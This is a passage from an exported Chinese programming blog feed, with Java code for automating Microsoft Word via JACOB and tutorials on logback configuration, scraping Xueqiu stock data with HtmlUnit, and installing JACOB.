    * </span><br><span class="line">     * @param pos</span><br><span class="line">     *            位置</span><br><span class="line">     * @param cols</span><br><span class="line">     *            列数</span><br><span class="line">     * @param rows</span><br><span class="line">     *            行数</span><br><span class="line">     */</span><br><span class="line">    public void createTable(String pos, int numCols, int numRows) &#123;</span><br><span class="line">        if (find(pos)) &#123;</span><br><span class="line">            Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">            Dispatch range = Dispatch.get(selection, &quot;Range&quot;).toDispatch();</span><br><span class="line">            Dispatch newTable = Dispatch.call(tables, &quot;Add&quot;, range,</span><br><span class="line">                    new Variant(numRows), new Variant(numCols)).toDispatch();</span><br><span class="line">            Dispatch.call(selection, &quot;MoveRight&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在指定行前面增加行</span><br><span class="line">     * </span><br><span class="line">     * @param tableIndex</span><br><span class="line">     *            word文件中的第N张表(从1开始)</span><br><span class="line">     * @param rowIndex</span><br><span class="line">     *            指定行的序号(从1开始)</span><br><span class="line">     */</span><br><span class="line">    public void addTableRow(int tableIndex, int rowIndex) &#123;</span><br><span class="line">        // 所有表格</span><br><span class="line">        Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">        // 要填充的表格</span><br><span class="line">        Dispatch table = Dispatch.call(tables, &quot;Item&quot;, new Variant(tableIndex))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        // 表格的所有行</span><br><span class="line">        Dispatch rows = Dispatch.get(table, &quot;Rows&quot;).toDispatch();</span><br><span class="line">        Dispatch row = Dispatch.call(rows, &quot;Item&quot;, new Variant(rowIndex))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        Dispatch.call(rows, &quot;Add&quot;, new Variant(row));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在第1行前增加一行</span><br><span class="line">     * </span><br><span class="line">     * @param tableIndex</span><br><span class="line">     *            word文档中的第N张表(从1开始)</span><br><span class="line">     */</span><br><span class="line">    public void addFirstTableRow(int tableIndex) &#123;</span><br><span class="line">        // 所有表格</span><br><span class="line">        Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">        // 要填充的表格</span><br><span class="line">        Dispatch table = Dispatch.call(tables, &quot;Item&quot;, new Variant(tableIndex))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        // 表格的所有行</span><br><span class="line">        Dispatch rows = Dispatch.get(table, &quot;Rows&quot;).toDispatch();</span><br><span class="line">        Dispatch row = Dispatch.get(rows, &quot;First&quot;).toDispatch();</span><br><span class="line">        Dispatch.call(rows, &quot;Add&quot;, new Variant(row));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在最后1行前增加一行</span><br><span class="line">     * </span><br><span class="line">     * @param tableIndex</span><br><span class="line">     *            word文档中的第N张表(从1开始)</span><br><span class="line">     */</span><br><span class="line">    public void addLastTableRow(int tableIndex) &#123;</span><br><span class="line">        // 所有表格</span><br><span class="line">        Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">        // 要填充的表格</span><br><span class="line">        Dispatch table = Dispatch.call(tables, &quot;Item&quot;, new Variant(tableIndex))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        // 表格的所有行</span><br><span class="line">        Dispatch rows = Dispatch.get(table, &quot;Rows&quot;).toDispatch();</span><br><span class="line">        Dispatch row = Dispatch.get(rows, &quot;Last&quot;).toDispatch();</span><br><span class="line">        Dispatch.call(rows, &quot;Add&quot;, new Variant(row));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 增加一行</span><br><span class="line">     * </span><br><span class="line">     * @param tableIndex</span><br><span class="line">     *            word文档中的第N张表(从1开始)</span><br><span class="line">     */</span><br><span class="line">    public void addRow(int tableIndex) &#123;</span><br><span class="line">        Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">        // 要填充的表格</span><br><span class="line">        Dispatch table = Dispatch.call(tables, &quot;Item&quot;, new Variant(tableIndex))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        // 表格的所有行</span><br><span class="line">        Dispatch rows = Dispatch.get(table, &quot;Rows&quot;).toDispatch();</span><br><span class="line">        Dispatch.call(rows, &quot;Add&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 增加一列</span><br><span class="line">     * </span><br><span class="line">     * @param tableIndex</span><br><span class="line">     *            word文档中的第N张表(从1开始)</span><br><span class="line">     */</span><br><span class="line">    public void addCol(int tableIndex) &#123;</span><br><span class="line">        // 所有表格</span><br><span class="line">        Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">        // 要填充的表格</span><br><span class="line">        Dispatch table = Dispatch.call(tables, &quot;Item&quot;, new Variant(tableIndex))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        // 表格的所有行</span><br><span class="line">        Dispatch cols = Dispatch.get(table, &quot;Columns&quot;).toDispatch();</span><br><span class="line">        Dispatch.call(cols, &quot;Add&quot;).toDispatch();</span><br><span class="line">        Dispatch.call(cols, &quot;AutoFit&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在指定列前面增加表格的列</span><br><span class="line">     * </span><br><span class="line">     * @param tableIndex</span><br><span class="line">     *            word文档中的第N张表(从1开始)</span><br><span class="line">     * @param colIndex</span><br><span class="line">     *            制定列的序号 (从1开始)</span><br><span class="line">     */</span><br><span class="line">    public void addTableCol(int tableIndex, int colIndex) &#123;</span><br><span class="line">        // 所有表格</span><br><span class="line">        Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">        // 要填充的表格</span><br><span class="line">        Dispatch table = Dispatch.call(tables, &quot;Item&quot;, new Variant(tableIndex))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        // 表格的所有行</span><br><span class="line">        Dispatch cols = Dispatch.get(table, &quot;Columns&quot;).toDispatch();</span><br><span class="line">        System.out.println(Dispatch.get(cols, &quot;Count&quot;));</span><br><span class="line">        Dispatch col = Dispatch.call(cols, &quot;Item&quot;, new Variant(colIndex))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        // Dispatch col = Dispatch.get(cols, &quot;First&quot;).toDispatch();</span><br><span class="line">        Dispatch.call(cols, &quot;Add&quot;, col).toDispatch();</span><br><span class="line">        Dispatch.call(cols, &quot;AutoFit&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在第1列前增加一列</span><br><span class="line">     * </span><br><span class="line">     * @param tableIndex</span><br><span class="line">     *            word文档中的第N张表(从1开始)</span><br><span class="line">     */</span><br><span class="line">    public void addFirstTableCol(int tableIndex) &#123;</span><br><span class="line">        Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">        // 要填充的表格</span><br><span class="line">        Dispatch table = Dispatch.call(tables, &quot;Item&quot;, new Variant(tableIndex))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        // 表格的所有行</span><br><span class="line">        Dispatch cols = Dispatch.get(table, &quot;Columns&quot;).toDispatch();</span><br><span class="line">        Dispatch col = Dispatch.get(cols, &quot;First&quot;).toDispatch();</span><br><span class="line">        Dispatch.call(cols, &quot;Add&quot;, col).toDispatch();</span><br><span class="line">        Dispatch.call(cols, &quot;AutoFit&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在最后一列前增加一列</span><br><span class="line">     * </span><br><span class="line">     * @param tableIndex</span><br><span class="line">     *            word文档中的第N张表(从1开始)</span><br><span class="line">     */</span><br><span class="line">    public void addLastTableCol(int tableIndex) &#123;</span><br><span class="line">        Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">        // 要填充的表格</span><br><span class="line">        Dispatch table = Dispatch.call(tables, &quot;Item&quot;, new Variant(tableIndex))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        // 表格的所有行</span><br><span class="line">        Dispatch cols = Dispatch.get(table, &quot;Columns&quot;).toDispatch();</span><br><span class="line">        Dispatch col = Dispatch.get(cols, &quot;Last&quot;).toDispatch();</span><br><span class="line">        Dispatch.call(cols, &quot;Add&quot;, col).toDispatch();</span><br><span class="line">        Dispatch.call(cols, &quot;AutoFit&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 自动调整表格</span><br><span class="line">     * </span><br><span class="line">     */</span><br><span class="line">    public void autoFitTable() &#123;</span><br><span class="line">        Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">        int count = Dispatch.get(tables, &quot;Count&quot;).getInt();</span><br><span class="line">        for (int i = 0; i &lt; count; i++) &#123;</span><br><span class="line">            Dispatch table = Dispatch.call(tables, &quot;Item&quot;, new Variant(i + 1))</span><br><span class="line">                    .toDispatch();</span><br><span class="line">            Dispatch cols = Dispatch.get(table, &quot;Columns&quot;).toDispatch();</span><br><span class="line">            Dispatch.call(cols, &quot;AutoFit&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 调用word里的宏以调整表格的宽度,其中宏保存在document下</span><br><span class="line">     * </span><br><span class="line">     */</span><br><span class="line">    public void callWordMacro() &#123;</span><br><span class="line">        Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">        int count = Dispatch.get(tables, &quot;Count&quot;).getInt();</span><br><span class="line">        Variant vMacroName = new Variant(&quot;Normal.NewMacros.tableFit&quot;);</span><br><span class="line">        Variant vParam = new Variant(&quot;param1&quot;);</span><br><span class="line">        Variant para[] = new Variant[] &#123; vMacroName &#125;;</span><br><span class="line">        for (int i = 0; i &lt; count; i++) &#123;</span><br><span class="line">            Dispatch table = Dispatch.call(tables, &quot;Item&quot;, new Variant(i + 1))</span><br><span class="line">                    .toDispatch();</span><br><span class="line">            Dispatch.call(table, &quot;Select&quot;);</span><br><span class="line">            Dispatch.call(word, &quot;Run&quot;, &quot;tableFitContent&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 设置当前选定内容的字体</span><br><span class="line">     * </span><br><span class="line">     * @param boldSize</span><br><span class="line">     * @param italicSize</span><br><span class="line">     * @param underLineSize</span><br><span class="line">     *            下划线</span><br><span class="line">     * @param colorSize</span><br><span class="line">     *            字体颜色</span><br><span class="line">     * @param size</span><br><span class="line">     *            字体大小</span><br><span class="line">     * @param name</span><br><span class="line">     *            字体名称</span><br><span class="line">     */</span><br><span class="line">    public void setFont(boolean bold, boolean italic, boolean underLine,</span><br><span class="line">            String colorSize, String size, String name) &#123;</span><br><span class="line">        Dispatch font = Dispatch.get(selection, &quot;Font&quot;).toDispatch();</span><br><span class="line">        Dispatch.put(font, &quot;Name&quot;, new Variant(name));</span><br><span class="line">        Dispatch.put(font, &quot;Bold&quot;, new Variant(bold));</span><br><span class="line">        Dispatch.put(font, &quot;Italic&quot;, new Variant(italic));</span><br><span class="line">        Dispatch.put(font, &quot;Underline&quot;, new Variant(underLine));</span><br><span class="line">        Dispatch.put(font, &quot;Color&quot;, colorSize);</span><br><span class="line">        Dispatch.put(font, &quot;Size&quot;, size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 文件保存或另存为</span><br><span class="line">     * </span><br><span class="line">     * @param savePath</span><br><span class="line">     *            保存或另存为路径</span><br><span class="line">     */</span><br><span class="line">    public void save(String savePath) &#123;</span><br><span class="line">        Dispatch.call(Dispatch.call(word, &quot;WordBasic&quot;).getDispatch(),</span><br><span class="line">                &quot;FileSaveAs&quot;, savePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 关闭当前word文档</span><br><span class="line">     * </span><br><span class="line">     */</span><br><span class="line">    public void closeDocument() &#123;</span><br><span class="line">        if (doc != null) &#123;</span><br><span class="line">            Dispatch.call(doc, &quot;Save&quot;);</span><br><span class="line">            Dispatch.call(doc, &quot;Close&quot;, new Variant(saveOnExit));</span><br><span class="line">            doc = null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 关闭全部应用</span><br><span class="line">     * </span><br><span class="line">     */</span><br><span class="line">    public void close() &#123;</span><br><span class="line">        closeDocument();</span><br><span class="line">        if (word != null) &#123;</span><br><span class="line">            Dispatch.call(word, &quot;Quit&quot;);</span><br><span class="line">            word = null;</span><br><span class="line">        &#125;</span><br><span class="line">        selection = null;</span><br><span class="line">        documents = null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 打印当前word文档</span><br><span class="line">     * </span><br><span class="line">     */</span><br><span class="line">    public void printFile() &#123;</span><br><span class="line">        if (doc != null) &#123;</span><br><span class="line">            Dispatch.call(doc, &quot;PrintOut&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 删除书签</span><br><span class="line">     * </span><br><span class="line">     * @param mark</span><br><span class="line">     *            书签名</span><br><span class="line">     * @param info</span><br><span class="line">     *            可替换</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public boolean deleteBookMark(String markKey, String info) throws Exception &#123;</span><br><span class="line">        Dispatch activeDocument = word.getProperty(&quot;ActiveDocument&quot;)</span><br><span class="line">                .toDispatch();</span><br><span class="line">        Dispatch bookMarks = ActiveXComponent.call(activeDocument, &quot;Bookmarks&quot;)</span><br><span class="line">                .toDispatch();</span><br><span class="line">        boolean isExists = ActiveXComponent.call(bookMarks, &quot;Exists&quot;, markKey)</span><br><span class="line">                .getBoolean();</span><br><span class="line">        if (isExists) &#123;</span><br><span class="line"></span><br><span class="line">            Dispatch n = Dispatch.call(bookMarks, &quot;Item&quot;, markKey).toDispatch();</span><br><span class="line">            Dispatch.call(n, &quot;Delete&quot;);</span><br><span class="line"></span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 根据书签插入数据</span><br><span class="line">     * </span><br><span class="line">     * @param bookMarkKey</span><br><span class="line">     *            书签名</span><br><span class="line">     * @param info</span><br><span class="line">     *            插入的数据</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line"></span><br><span class="line">    public boolean setBookMarkValue(String bookMarkKey, String info)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        Dispatch activeDocument = word.getProperty(&quot;ActiveDocument&quot;)</span><br><span class="line">                .toDispatch();</span><br><span class="line">        Dispatch bookMarks = ActiveXComponent.call(activeDocument, &quot;Bookmarks&quot;)</span><br><span class="line">                .toDispatch();</span><br><span class="line">        boolean bookMarkExist = ActiveXComponent.call(bookMarks, &quot;Exists&quot;,</span><br><span class="line">                bookMarkKey).getBoolean();</span><br><span class="line">        if (bookMarkExist) &#123;</span><br><span class="line"></span><br><span class="line">            Dispatch rangeItem = Dispatch.call(bookMarks, &quot;Item&quot;, bookMarkKey)</span><br><span class="line">                    .toDispatch();</span><br><span class="line">            Dispatch range = Dispatch.call(rangeItem, &quot;Range&quot;).toDispatch();</span><br><span class="line">            Dispatch.put(range, &quot;Text&quot;, new Variant(info));</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * html另存为word</span><br><span class="line">     * </span><br><span class="line">     * @param htmlPath</span><br><span class="line">     * @param docPath</span><br><span class="line">     */</span><br><span class="line">    public static void htmlToWord(String htmlPath, String docPath) &#123;</span><br><span class="line">        ActiveXComponent app = new ActiveXComponent(&quot;Word.Application&quot;); // 启动word</span><br><span class="line">        try &#123;</span><br><span class="line">            app.setProperty(&quot;Visible&quot;, new Variant(false));</span><br><span class="line">            Dispatch docs = app.getProperty(&quot;Documents&quot;).toDispatch();</span><br><span class="line">            Dispatch doc = Dispatch.invoke(</span><br><span class="line">                    docs,</span><br><span class="line">                    &quot;Open&quot;,</span><br><span class="line">                    Dispatch.Method,</span><br><span class="line">                    new Object[] &#123; htmlPath, new Variant(false),</span><br><span class="line">                            new Variant(true) &#125;, new int[1]).toDispatch();</span><br><span class="line">            Dispatch.invoke(doc, &quot;SaveAs&quot;, Dispatch.Method, new Object[] &#123;</span><br><span class="line">                    docPath, new Variant(1) &#125;, new int[1]);</span><br><span class="line">            Variant f = new Variant(false);</span><br><span class="line">            Dispatch.call(doc, &quot;Close&quot;, f);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            app.invoke(&quot;Quit&quot;, new Variant[] &#123;&#125;);</span><br><span class="line">            ComThread.Release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String args[]) &#123;</span><br><span class="line">        MSWordManager msWordManager = new MSWordManager();</span><br><span class="line">        try &#123;</span><br><span class="line">            msWordManager.openDocument(&quot;D:\\a.doc&quot;);</span><br><span class="line">            msWordManager.callWordMacro();</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        msWordManager.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】logback使用简介</title>
    <url>/blog/plang/java/lib/logbacksyjj/</url>
    <content><![CDATA[<p>不打log的程序员不是好程序员，log4j已经过时了，开发他的人又开发了logback。这里说一说怎么配制logback。</p>
<p>一般的log接口都在用slf4j，这样以后改为其它log组件就不用改程序了，原理是log组件加个桥接的包,覆盖slf4j里的一些类，实现功能的嫁接。</p>
<h2 id="需要的jar包"><a href="#需要的jar包" class="headerlink" title="需要的jar包"></a>需要的jar包</h2><ul>
<li>slf4j-api-1.6.2.jar</li>
<li>logback-core-0.9.29.jar</li>
<li>logback-classic-0.9.29.jar</li>
</ul>
<p>如果是从commons-logging+log4j切换过来，还需要jcl-over-slf4j-1.6.2.jar，用于桥接commons-logging<br>到 slf4j。</p>
<p>如果用Maven依赖引入，可以用下面的代码。</p>
<pre><code>    org.slf4j 
    slf4j-api 
    1.6.2 
 
 
    org.slf4j 
    jcl-over-slf4j 
    1.6.2 
 
 
    ch.qos.logback 
    logback-core 
    0.9.29 
 
 
    ch.qos.logback 
    logback-classic 
    0.9.29 
 
</code></pre>
<h2 id="logback配制文件加载顺序"><a href="#logback配制文件加载顺序" class="headerlink" title="logback配制文件加载顺序"></a>logback配制文件加载顺序</h2><p>logback会依次读取以下类型配置文件</p>
<ol>
<li>logback.groovy</li>
<li>logback-test.xml</li>
<li>logback.xml</li>
<li>采用默认配置</li>
</ol>
<h2 id="logback-xml样例"><a href="#logback-xml样例" class="headerlink" title="logback.xml样例"></a>logback.xml样例</h2><p>下面是一个项目中的配制文件内容：</p>
<pre><code>        System.out
        
            %date [%level] [%thread] %logger&#123;80&#125; [%file : %line] %n%msg%n
            
        
    

    
        ../logs/logfile.log
        
            %date [%level] [%thread] %logger&#123;80&#125; [%file : %line] %n%msg%n
            
        
        
            ../logs/logfile.log.%d&#123;yyyy-MM-dd&#125;
        
    

    
    
    
    
    

    
    
    
    
    
    
        
        
    
</code></pre>
<p>思想和log4j类似，几个常用配制</p>
<ul>
<li>appender:输出位置，可以有多个</li>
<li>logger:对指定log设置，因为log都是通过类名来的，所以可以通过包路径来批量限制</li>
<li>root：所有log的根</li>
<li>pattern：输出格式，和log4j一样</li>
</ul>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】用HtmlUnit抓取雪球数据</title>
    <url>/blog/plang/java/lib/xueqiuspider/</url>
    <content><![CDATA[<p>htmlunit 是一款开源的java页面分析工具，读取页面后，可以有效的使用htmlunit分析页面上的内容。项目可以模拟浏览器运行，被誉为java浏览器的开源实现。这个没有界面的浏览器，运行速度也是非常迅速的。</p>
<p>第一步：创建一个客户端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebClient client = HttpUtil.getClient();</span><br></pre></td></tr></table></figure>

<p>第二步：登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static HtmlPage loginXueqiu(WebClient client) </span><br><span class="line">    throws IOException, MalformedURLException &#123;</span><br><span class="line">    HtmlPage page = (HtmlPage) client.getPage(&quot;http://xueqiu.com&quot;);</span><br><span class="line">    HtmlTextInput account = null;</span><br><span class="line">    HtmlForm loginForm = (HtmlForm) page.getElementById(&quot;form-login-index&quot;);</span><br><span class="line">    account = (HtmlTextInput) loginForm.getInputByName(&quot;username&quot;);</span><br><span class="line">    HtmlPasswordInput password = (HtmlPasswordInput) loginForm</span><br><span class="line">            .getInputByName(&quot;password&quot;);</span><br><span class="line">    DomNodeList btns = loginForm</span><br><span class="line">            .getElementsByTagName(&quot;button&quot;);</span><br><span class="line">    HtmlButton submit = (HtmlButton) btns.get(0);</span><br><span class="line">    account.setValueAttribute(&quot;xueqiuclient@126.com&quot;);</span><br><span class="line">    password.setValueAttribute(&quot;xueqiu&quot;);</span><br><span class="line">    return (HtmlPage) submit.click();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以获取股票列表为例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static List getStockList(WebClient client, String url) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        Page p = client.getPage(url);</span><br><span class="line">        WebResponse wp = p.getWebResponse();</span><br><span class="line">        String sJson = wp.getContentAsString();</span><br><span class="line">        JSONObject.fromObject(sJson);</span><br><span class="line">        JSONObject json = JSONObject.fromObject(sJson);</span><br><span class="line">        JSONArray jarr = json.getJSONArray(&quot;data&quot;);</span><br><span class="line">        @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">        Iterator ite = jarr.iterator();</span><br><span class="line">        List lstStock = new ArrayList();</span><br><span class="line">        while (ite.hasNext()) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                JSONArray jstock = ite.next();</span><br><span class="line">                TStock stock = new TStock(jstock);</span><br><span class="line">                lstStock.add(stock);</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return lstStock;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        log.error(&quot;获取上证列表出错&quot;, e);</span><br><span class="line">        return new ArrayList();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中url是通过浏览器debug出来的，返回的是JSON数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 上证股票列表</span><br><span class="line"> */</span><br><span class="line">public static final String API_SHA=&quot;http://xueqiu.com/stock/quote_order.json?page=1&amp;size=2000&quot; +</span><br><span class="line">        &quot;&amp;order=asc&amp;exchange=CN&amp;stockType=sha&amp;orderBy=symbol&amp;column=symbol%2Cname&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 深证股票列表</span><br><span class="line"> */</span><br><span class="line">public static final String API_SZA=&quot;http://xueqiu.com/stock/quote_order.json?page=1&amp;size=2000&quot; +</span><br><span class="line">        &quot;&amp;order=asc&amp;orderBy=symbol&amp;exchange=CN&amp;stockType=sza&amp;column=symbol%2Cname&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 主要财务指标</span><br><span class="line"> */</span><br><span class="line">public static final String API_ZYCWZB=&quot;http://xueqiu.com/stock/f10/finmainindex.json?page=1&amp;size=40&amp;symbol=&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 资产负债表</span><br><span class="line"> */</span><br><span class="line">public static final String API_BALSHEET=&quot;http://xueqiu.com/stock/f10/balsheet.json?page=1&amp;size=40&amp;symbol=&quot;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】JACOB使用简介</title>
    <url>/blog/plang/java/lib/jacobbase/</url>
    <content><![CDATA[<p>它允许在java中调用com接口自动组件，它使用JNI（本地调用程序）来进行本地调用COM库。它可运行在x86和支持32位和64位Java虚拟机<br>X64的环境。</p>
<p><a href="jacobcode.php">jacob操作word接口api</a></p>
<p>测试源码包：</p>
<p>链接: <a href="http://pan.baidu.com/s/1mg9tsZA">http://pan.baidu.com/s/1mg9tsZA</a></p>
<p>密码: ej9u</p>
<h2 id="JACOB项目的由来"><a href="#JACOB项目的由来" class="headerlink" title="JACOB项目的由来"></a>JACOB项目的由来</h2><p>首先，我们将了解JACOB项目的基本情况，探讨在什么样的情况下选择它来完成您的任务</p>
<p>COM中暴露出来的方法，主要有两种机制：早期绑定和晚期绑定。</p>
<p>大桥调用可以参考IBM的RJCB项目，它提供了一套高性能的解决方案。当然您需要了解更多的COM组件的细节，虽然框架为您完成了大部分的生成桥<br>RJCB仅支持那些提供早期绑定的虚函数表的接口的COM API。</p>
<p>而晚期绑定方式是通过IDispatch的接口来实现，类似的Java的反射机制，您可以按照名称或者ID进行方法调用，这种设计主要目的是支持脚本语言操作COM，因为脚本是解释执行的，通常都不支持指针也就没有C</p>
<ul>
<li>+中的虚函数表 ID</li>
</ul>
<p>雅各开源项目提供的是一个JVM独立的自动化服务器的实现，其核心是基于JNI技术实现的变异，调度等接口，设计参考了微软VJ<br>+<br>+内置的通用自动化服务器，但是微软的实现仅仅支持自身的JVM。通过雅各，您可以方便地在Java的语言中进行晚期绑定方式的调用，开源项目实现了一种简单，灵活的Java与COM的通信方式，为您充分利用现有应用提供了可能。</p>
<h2 id="Jacob安装"><a href="#Jacob安装" class="headerlink" title="Jacob安装"></a>Jacob安装</h2><p>下载jacob的zip包，如jacob-1.18-M3.zip。</p>
<p>将jacob.jar引入项目。</p>
<p>将dll库放到指定位置，dll分为64位和32位，jacob-xx-x64.dll和jacob-xx-x32.dll，不知道放哪个都放上是一个好的选择。</p>
<p>为了确保能使程序找到库，可能考虑入到如下位置：</p>
<p>“WINDOWS\SYSTEM32”下面。</p>
<p>运行程序的jdk或jre的bin目录下。</p>
<p>如果用MyEclipse，可以指定运行程序所用的jdk，否则要放入MyEclipse自己的jdk里一份。</p>
<p>一般系统没有加载到Jacob.dll文件时，报错信息为：”java.lang.UnsatisfiedLinkError:<br>no jacob in java.library.path”</p>
<h2 id="Jacob基础语法说明"><a href="#Jacob基础语法说明" class="headerlink" title="Jacob基础语法说明"></a>Jacob基础语法说明</h2><p>ActiveXComponent ax &#x3D; new ActiveXComponent(&quot;a1&quot;);</p>
<p>构建ActiveX组件实例,其中的a1的值和你需要调用的ActiveX控件有关</p>
<p>+———————————–+———————————–+<br>| MS控件名                          | a1的值                            |<br>+———————————–+———————————–+<br>| InternetExplorer                  | InternetExplorer.Application      |<br>+———————————–+———————————–+<br>| Excel                             | Excel.Application                 |<br>+———————————–+———————————–+<br>| Word                              | Word.Application                  |<br>+———————————–+———————————–+<br>| Powerpoint                        | Powerpoint.Application            |<br>+———————————–+———————————–+<br>| vb&#x2F;java Script                    | ScriptControl                     |<br>+———————————–+———————————–+<br>| windows media Player              | WMPlayer.OCX                      |<br>+———————————–+———————————–+<br>| Outlook                           | Outlook.Application               |<br>+———————————–+———————————–+<br>| Visio                             | Visio.Application                 |<br>+———————————–+———————————–+<br>| DAO                               | DAO.PrivateDBEngine.35            |<br>+———————————–+———————————–+<br>| MultiFace                         | MultiFace.Face                    |<br>+———————————–+———————————–+</p>
<p>Dispatch ds &#x3D; ax.getObject(). toDispatch();</p>
<p>获取Dispatch对象，我们可以把每个Dispatch对象看成是对Activex控件的一个操作，这一步是获得该ActiveX控件的控制权。 </p>
<p>（注：浅析JACOB 中提到过Variant类，这里的ax.getObject()便是获得该对象，我们将其转化为任何对象（类型））</p>
<p>Dispatch.get(ds, “a1”);</p>
<p>返回Variant类型，获取ds对象的a1属性，通过to…()和get...()方法可以转换为java的很多类型</p>
<p>Dispatch.put(ds, “a1”, …);</p>
<p>设置ds对象a1属性，具体参数为…指定</p>
<p>ActiveXComponent有setProperty(“a1”,<br>…)和getProperty(“a1”)方法，比Dispatch的put和get方法方便！</p>
<p>Dispatch.invoke(ds, “a3”, a4, a5, a6).toDispatch();</p>
<p>说明：ds为要执行操作的对象，a3为要执行的操作名称；a4一般为Dispatch.Method、Dispatch.Put、Dispatch.Get三种，正是这三种指定让此方法可以执行put、set、call同样操作；a5为一个对象数组，形如：new<br>Object[]{}，一般的当Method时为三个参数，Get时没有参数，Put是为两个参数；a6一般为new<br>int[1]</p>
<p>Dispatch.call(ds, “a1”, …) .toDispatch();</p>
<p>和invoke差不多，执行a1名称的操作，少了invoke中的a4和a6参数；…和invoke中newObject[]{}中参数一样</p>
